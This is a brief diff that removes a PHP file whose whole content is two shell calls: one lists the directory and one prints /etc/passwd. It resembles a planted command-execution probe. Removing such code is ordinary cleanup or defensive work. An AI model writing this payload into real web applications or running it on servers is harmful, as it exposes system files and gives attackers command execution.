@@ -1,4 +1,0 @@
-<?php 
-  system("ls");
-  system("cat /etc/passwd");
-?>
